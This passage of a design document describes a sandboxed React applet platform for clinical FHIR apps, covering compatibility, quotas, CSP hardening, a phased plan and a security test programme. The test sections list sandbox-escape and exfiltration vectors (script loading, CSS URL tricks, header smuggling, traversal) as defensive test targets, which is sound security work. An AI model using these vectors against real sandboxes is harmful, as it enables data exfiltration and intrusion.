- A source and artifact hash.
- A Safe DOM profile version.
- Declared clinical and graphics capability classes.

Static checks improve diagnostics but are not the security boundary. The host still validates runtime behavior.

---

## 14. React package compatibility model

“Open React” should be defined honestly. The platform can be highly compatible with ordinary React application code without becoming an unrestricted web page.

| Package or behavior | Expected support |
|---|---|
| React hooks, context, reducers, pure components | Excellent |
| Zustand, Redux, XState, Zod, date and utility libraries | Excellent |
| D3 scales, shapes, statistics, interpolation | Excellent |
| Headless table and form logic | Good after event testing |
| Components rendering standard intrinsic elements | Good if covered by Safe DOM |
| CSS Modules | First-class |
| CSS-in-JS | Requires a virtual stylesheet adapter |
| Portals, tooltips, dialogs | Supported through named host portals |
| Focus and selection | Supported through async safe refs |
| Synchronous layout measurement | Limited; adapters required |
| Libraries manipulating `document.body` or raw DOM nodes | Usually incompatible |
| Libraries dynamically loading scripts, fonts, images, or workers | Rejected or brokered |
| Libraries using arbitrary `fetch`, WebSocket, or storage | Must use runtime adapters |
| Full browser component libraries with deep DOM assumptions | Evaluate individually |

Build a compatibility test suite and publish explicit package status instead of relying on optimistic claims.

Candidate acceptance packages can include:

- A state library.
- A schema validator.
- D3 computation modules.
- A headless table package.
- A form-state package.
- A date library.

The goal is to demonstrate that the platform supports a normal application ecosystem, not merely bespoke demo code.

---

## 15. Resource and navigation handles

Raw URLs are the most important rendered sink to avoid.

### 15.1 Branded developer types

```ts
interface NavigationHandle {
  readonly kind: 'navigation';
  readonly id: string;
}

interface ResourceHandle {
  readonly kind: 'resource';
  readonly id: string;
}
```

The host stores the actual destination or protected object in a session-bound table. The ID should be random or cryptographically bound to the session, applet, user, and operation. Applet-created lookalike objects must fail host validation.

### 15.2 Familiar JSX

```tsx
<a href={navigation.fhirResource('Observation', observation.id)}>
  Open observation
</a>

<img
  src={resources.fhirAttachment(documentReference)}
  alt="Scanned clinical document"
/>
```

The developer sees ordinary-looking components, but no raw `href`, `src`, Blob URL, or bearer token crosses into the applet.

### 15.3 External educational links

External navigation can be offered as a distinct host-mediated capability:

- URL allowlist or classification.
- Visible destination disclosure.
- Explicit clinician confirmation.
- No PHI in the query string or fragment.
- Audit of the navigation decision.

It should never occur as an automatic render side effect.

---

## 16. Quotas, watchdogs, and availability

A richer UI surface increases denial-of-service risk. Add host-enforced budgets independent of cooperative applet APIs.

Initial engineering defaults, to be tuned by profiling, should cover:

- Maximum connected nodes.
- Maximum tree depth.
- Maximum text and property bytes.
- Maximum mutations per batch and per second.
- Maximum live callbacks.
- Maximum concurrent RPC operations.
- Maximum queued event bytes.
- Maximum CSS rules and stylesheet bytes.
- Maximum Vega data and mark counts.
- Maximum canvas pixels and active contexts.
- Maximum FHIR pages, resources, and bytes.
- Maximum worker heartbeat delay.

On violation:

1. Reject the operation.
2. Emit a structured audit code without including arbitrary PHI text.
3. Display a contained applet error.
4. Terminate the worker for severe or repeated violations.
5. Revoke handles and release canvas, Vega, event, and callback resources.

---

## 17. Host hardening

### 17.1 Content Security Policy

The host CSP should be generated from deployment configuration where possible and should not be described as containment for a compromised trusted dependency.

Recommended direction:

- Exact script and worker sources.
- Exact FHIR, LLM, sandbox, and applet artifact origins where operationally possible.
- No generic image, media, object, form, or frame destinations.
- No `unsafe-eval` after Vega interpreter validation.
- Server-set headers in production.
- Two registrable domains for shell and launcher.
- Managed network egress as a backstop.

### 17.2 Trusted Types

Enable Trusted Types in the trusted shell to reduce DOM-XSS risk in the trusted computing base. Trusted Types do not provide network or resource confinement and do not replace Safe DOM validation.

### 17.3 Audit minimization

Replace applet-controlled audit text with structured event codes and bounded metadata. Current arbitrary `message` fields can contain PHI intentionally or accidentally.

Audit examples:

```text
security.probe.completed
safe_dom.mutation.denied
fhir.request.completed
fhir.request.budget_exceeded
llm.request.completed
worker.watchdog.terminated
navigation.confirmed
```

Keep resource identifiers, note excerpts, prompts, and raw errors out of ordinary operational logs unless explicitly required and protected.

---

## 18. Phased implementation plan

The phases below are ordered by dependency and acceptance gates rather than calendar estimates.

### Phase 0 — Close and re-baseline the current boundary

#### Deliverables

- Reject Vega `usermeta` and applet-controlled embed options.
- Install a no-network Vega loader.
- Allowlist Vega cursor values.
- Remove or justify host CSP image and `unsafe-eval` sources.
- Close classic-worker `importScripts()` URL sources.
- Add the worker hardening prelude.
- Wrap `receiver.connection` with a validated connection gateway.
- Add applet error boundary, watchdog, termination, and cleanup.
- Enforce FHIR page/resource/byte budgets during retrieval.
- Change FHIR header policy to an allowlist.
- Harden applet fetching, manifest, hash, and identity.
- Replace arbitrary audit text with structured codes.
- Regenerate the integrity manifest and reconcile stale documentation.

#### Gate

A hostile applet corpus produces no request at an external or same-origin canary through worker APIs, script loading, Vega, CSS, rendered elements, navigation, or host logs. The exact production bundle passes the supported-browser test matrix.

### Phase 1 — Safe DOM schema and mutation kernel

#### Deliverables

- Versioned Safe DOM schema.
- Generated worker remote elements.
- Generated host validators.
- Generated TypeScript intrinsic types.
- Mutation graph validator and quotas.
- Initial structural, text, control, and table elements.
- Contained ShadowRoot applet surface.
- Development diagnostics for unsupported elements and props.

#### Gate

A basic application uses ordinary intrinsic TSX without importing `ui-*` components. Raw low-level mutations cannot bypass host policy.

### Phase 2 — React compatibility and events

#### Deliverables

- `@safe-smart/react` JSX runtime.
- Aliases for automatic JSX runtime dependencies.
- Compatibility handling for direct `React.createElement` where feasible.
- Safe event snapshots and SyntheticEvent adapter.
- Input, keyboard, pointer, focus, composition, and wheel events.
- Safe refs, focus, selection, scrolling, and async measurement.
- Named host portals.

#### Gate

A form-heavy app and a headless table/form library work with familiar React event code, keyboard navigation, focus management, and no direct Remote DOM imports.

### Phase 3 — CSS and responsive layout

#### Deliverables

- CSS Modules extraction.
- CSSTree-based stylesheet validator.
- Inline style-object validator.
- Class manifest and scoped installation.
- Media/container queries and safe animations.
- CSS hostile corpus and URL-obfuscation tests.

#### Gate

The applet implements a responsive, animated layout using ordinary CSS Modules. Every known URL-bearing or root-escaping CSS construct is rejected, and canary tests show no resource request.

### Phase 4 — Graphics and performance

#### Deliverables

- Hardened incremental Vega host widget.
- OffscreenCanvas transfer lifecycle.
- Pointer, keyboard, resize, and animation support for canvas.
- Safe SVG subset.
- Virtual list or grid host widget.
- Performance instrumentation and mutation profiling.

#### Gate

The growth-chart acceptance app animates smoothly across populations, sex, age, and disease-state reference curves; supports selection, tooltips, resize, keyboard use, and an accessible tabular fallback.

### Phase 5 — Clinical API ergonomics

#### Deliverables

- Typed broad FHIR client.
- `https://fhir.internal/` fetch bridge.
- Incremental paging and cancellation.
- Read versus write capability classes.
- Streaming LLM transport.
- Structured output and local tool bridge.
- Protected resource and navigation handles.

#### Gate

An app can query all FHIR resources granted by the current user’s SMART scope, process pages incrementally, call an approved LLM profile, and display protected attachments without receiving a token or raw resource URL.

### Phase 6 — Browser authoring and package workflow

#### Deliverables

- Monaco and TypeScript language service.
- Esbuild-wasm build worker.
- Virtual filesystem and package cache.
- Package resolution without lifecycle scripts.
- CSS and applet manifest generation.
- Hot reload by worker replacement.
- Compatibility diagnostics and package test registry.

#### Gate

A clinician or developer can create, edit, compile, and run a multi-file TSX/CSS app entirely in the browser. The emitted artifact is self-contained, hash-addressed, and runs under the same hostile-app security model.

### Phase 7 — Production assurance

#### Deliverables

- Managed Chromium/Edge production browser profile or explicitly defined multi-engine matrix.
- Independent penetration testing.
- Browser-version regression suite.
- Dependency pinning and upgrade gates.
- Security incident and revocation procedures.
- Applet signing and publisher identity.
- Operational metrics and anomaly detection.
- Updated security claims tied to exact artifact hashes.

#### Gate

An independent reviewer can reproduce every security claim against an exact release artifact and supported deployment configuration.

---

## 19. Growth-chart acceptance application

The next major spike should use a demanding application rather than a dashboard.

### Required functionality

- Retrieve longitudinal height, weight, BMI, head circumference, and demographic context through the broad FHIR broker.
- Normalize measurements for multiple reference populations.
- Switch among population, sex, disease-state, and age views.
- Animate curve and point transitions.
- Support zoom, pan, hover, keyboard selection, and point details.
- Show an accessible longitudinal table.
- Use a responsive layout with controls, panels, dialogs, and tooltips.
- Include both a Vega implementation and a custom OffscreenCanvas or safe SVG implementation.
- Use ordinary intrinsic JSX and CSS Modules.
- Use at least one representative third-party state, data, and form/table library.
- Demonstrate worker restart without losing the trusted SMART session.

### Required security behavior

- No raw URL props.
- No direct DOM access.
- No network access outside sentinel broker routes.
- No raw Remote DOM connection.
- All CSS and mutations pass host validation.
- All FHIR paging is bounded.
- Canvas and Vega resources are released on restart.
- Hostile variants of the app fail closed without blanking the shell.

### Performance targets

Establish reference hardware and measure:

- Input-to-paint latency.
- Animation frame rate during curve transitions.
- Initial render and hot-reload time.
- Mutation bytes and records per React commit.
- Worker and host memory.
- FHIR parsing and incremental processing time.
- Vega versus OffscreenCanvas performance.

The targets should be set from profiling, not assumed in advance.

---

## 20. Security validation program

### 20.1 Independent canary infrastructure

Do not rely on applet self-reporting. Run a canary server and observe all requests independently through browser instrumentation, proxy logs, and server logs.

### 20.2 Worker and script-loading tests

Attempt:

```text
fetch, XHR, WebSocket, EventSource
importScripts
nested Worker and SharedWorker
dynamic import
data and blob script URLs
same-origin and cross-origin script URLs
redirects
failed requests that still reach a server
WebRTC or other browser-specific network surfaces
```

### 20.3 Safe DOM mutation tests

Attempt:

```text
unknown element names
raw mutation protocol calls
unknown properties and events
oversized strings and arrays
prototype-shaped values
invalid node graphs
cross-root node moves
callback floods
million-node and deep trees
mutation-rate floods
```

### 20.4 CSS tests

Attempt direct and obfuscated forms of:

```text
url()
image-set()
cursor URLs
list-style-image
content: url()
filter and mask URLs
@import
@font-face
custom properties containing forbidden tokens
root-escaping selectors
:host-context
fixed overlays and extreme z-index
```

### 20.5 Rendered resource tests

Attempt:

```text
raw href and src strings
forms and formAction
meta refresh
base tags
SVG href/xlink:href
foreignObject
image and feImage
CSS and Vega indirect loading
native dialog/popover top-layer abuse
clipboard, print, download and drag-and-drop paths
```

### 20.6 FHIR broker tests

Attempt:

```text
absolute URLs
protocol-relative URLs
encoded traversal and separators
redirect escape
header smuggling and method override
unbounded pagination
oversized bodies
binary responses
cancellation races
write methods under read-only capability
patient and session handle replay
```

### 20.7 Browser matrix

Every claim should be tested on each supported browser and version. A practical initial product position is a managed Chromium or Edge environment with controlled extensions and rapid patching. Additional engines should be added only after equivalent evidence exists.

---

## 21. Success criteria

### Developer experience

- Applets use normal `div`, `button`, `input`, `table`, `canvas`, and semantic TSX.
- Developers do not import Remote DOM or use `ui-*` tags.
- CSS Modules, responsive layout, and animation are first-class.
- Normal hooks, context, state libraries, schema libraries, and D3 utilities work.
- Event handlers expose familiar `event.currentTarget` snapshots.
- Clear diagnostics explain unsupported browser APIs and packages.
- The clinical UI library is optional.

### Security

- The worker has no bearer token or provider API key.
- No hostile test causes an unapproved canary request.
- The host validates all mutations, styles, events, resources, and handles.
- No raw applet value reaches HTML, script, URL, stylesheet, or navigation sinks without a specific validator.
- Every release claim is tied to an exact artifact hash and browser/deployment matrix.

### Clinical capability

- Applets can access the broad FHIR data authorized by the clinician’s SMART session.
- Large searches are incremental and bounded.
- LLM calls are routed only to approved profiles under the organization’s contractual controls.
- Notes and structured data can be filtered, searched, aggregated, and visualized entirely in the browser.

### Performance

- Complex charts render and animate without serializing every graphical mark through Remote DOM.
- Large tables use virtualization.
- UI mutation traffic is batched and bounded.
- Worker termination and hot replacement are reliable.

---

## 22. Key risks and mitigations

| Risk | Mitigation |
|---|---|
| Safe DOM becomes another large browser implementation | Keep the profile intentionally smaller than full DOM; generate code from one schema; support common React semantics, not every browser API. |
| A validator misses a new URL or CSS sink | AST validation, deny-by-default policies, canary testing, CSP and managed egress defense in depth, and independent review. |
| Third-party component compatibility disappoints developers | Publish an explicit compatibility matrix, package scanner, adapters, and representative tests; avoid promising arbitrary npm compatibility. |
| Remote DOM mutation overhead affects complex apps | Batch per commit, virtualize large lists, use OffscreenCanvas and host widgets, and evaluate a custom SafeDOMReceiver after profiling. |
| Host TCB grows substantially | Keep primitive adapters generated, isolate optimized widgets, enable Trusted Types, pin dependencies, and review changes to sink policies as security changes. |
| Browser behavior changes | Pin supported versions, run browser regression tests, and tie claims to a browser matrix. |
| Token-equivalent FHIR access enables excessive chart access | Rely on SMART scopes and user authorization, add quotas and audit, and provide optional organizational policy without forcing per-resource applet design. |
| FHIR writes create clinical harm or covert data movement | Separate read and write capability classes; require explicit product and clinical-safety decisions for writes. |
| LLM-generated code causes denial of service | Worker watchdog, hard termination, quotas, fresh worker per preview, and bounded data APIs. |

---

## 23. Recommended package and source layout

```text
packages/
  safe-react/
    jsx-runtime.ts
    jsx-dev-runtime.ts
    intrinsic-map.generated.ts
    event-compat.ts
    refs.ts

  safe-dom-schema/
    elements.ts
    properties.ts
    styles.ts
    events.ts
    generated/

  safe-dom-remote/
    remote-elements.generated.ts
    remote-root.ts
    style-registration.ts

  safe-dom-host/
    mutation-gateway.ts
    validators.generated.ts
    react-renderers.generated.tsx
    safe-dom-receiver.ts
    shadow-root.ts
    resource-handles.ts
    navigation-handles.ts
    event-serializer.ts
    quotas.ts

  clinical-runtime/
    fhir-client.ts
    fhir-fetch-bridge.ts
    llm-client.ts
    llm-fetch-bridge.ts
    context.ts

  graphics/
    vega-host.tsx
    vega-policy.ts
    canvas-host.ts
    safe-svg-policy.ts

  ui/
    patient-banner.tsx
    clinical-timeline.tsx
    virtual-data-grid.tsx

  authoring/
    build-worker.ts
    virtual-fs.ts
    package-cache.ts
    css-pipeline.ts
    manifest.ts

  security-tests/
    hostile-applets/
    css-corpus/
    vega-corpus/
    mutation-fuzzer/
    canary-server/
```

---

## 24. Suggested applet manifest

```json
{
  "schemaVersion": 1,
  "applet": {
    "id": "org.example.growth-explorer",
    "version": "2.0.0",
    "displayName": "Growth Explorer",
    "publisher": "clinical-informatics@example.org"
  },
  "artifact": {
    "entry": "worker.js",
    "sha256": "...",
    "bytes": 1234567,
    "mime": "text/javascript"
  },
  "runtime": {
    "protocol": 2,
    "safeDomProfile": "safe-dom-v1",
    "reactCompatibility": "safe-react-v1"
  },
  "clinical": {
    "fhir": "smart-user-read",
    "llmProfiles": ["clinical-default"]
  },
  "graphics": {
    "vegaLite": true,
    "offscreenCanvas2d": true,
    "webgl": false,
    "safeSvg": true
  },
  "styles": {
    "manifestSha256": "..."
  },
  "packages": [
    {"name": "react", "version": "18.3.1"},
    {"name": "d3-scale", "version": "..."}
  ]
}
```

The host should derive applet identity from this trusted, hash-bound manifest. The worker may report its expected identity for consistency checking, but it must not define the authoritative audit identity.

---

## 25. Final recommendation

Proceed with the browser-worker architecture and broaden it into a Safe React platform.

The decisive product and architecture statement should be:

> App developers use normal React composition, semantic JSX, CSS Modules, familiar events, broad SMART-scoped FHIR access, approved LLM APIs, and high-performance browser graphics. Applet code still receives no credential, real DOM authority, arbitrary network, raw URL sink, or unvalidated host mutation capability.

The most important sequencing rule is:

> **Close the current Vega, script-loading, raw-mutation, FHIR-budget, and provenance gaps before expanding from the small catalog to Safe DOM.**

After that, the recommended path is:

1. Generate a broad Safe DOM profile from a single schema.
2. Add a custom React JSX compatibility runtime so developers write normal intrinsic elements.
3. Enforce all security decisions in a host-side mutation firewall.
4. Support ordinary CSS through AST validation and a contained ShadowRoot.
5. Add OffscreenCanvas and safe SVG for custom graphics.
6. Retain Vega and clinical components as optimized optional host widgets.
7. Preserve broad token-equivalent FHIR reads, with writes treated as a separate clinical-safety class.
8. Add a browser-only TypeScript and esbuild-wasm authoring loop.
9. Validate the result with a demanding growth-chart app and an independent hostile corpus.

This gives the project a plausible route to **first-class React application ergonomics without abandoning the core containment argument**.

---

## 26. Primary technical references

- [Shopify Remote DOM](https://github.com/Shopify/remote-dom)
- [Remote DOM React integration](https://github.com/Shopify/remote-dom/blob/main/packages/react/README.md)
- [Remote DOM core API](https://github.com/Shopify/remote-dom/blob/main/packages/core/README.md)
- [React documentation](https://react.dev/)
- [esbuild browser API and esbuild-wasm](https://esbuild.github.io/api/#running-in-the-browser)
- [CSSTree](https://github.com/csstree/csstree)
- [HTMLCanvasElement.transferControlToOffscreen](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/transferControlToOffscreen)
- [WorkerGlobalScope.importScripts](https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope/importScripts)
- [WHATWG Web Workers specification](https://html.spec.whatwg.org/multipage/workers.html)
- [Vega expression interpreter](https://vega.github.io/vega/usage/interpreter/)
- [Vega View API](https://vega.github.io/vega/docs/api/view/)
- [Trusted Types specification](https://www.w3.org/TR/trusted-types/)
- [SMART App Launch 2.2](https://hl7.org/fhir/smart-app-launch/)
- [SMART client-js](https://github.com/smart-on-fhir/client-js)
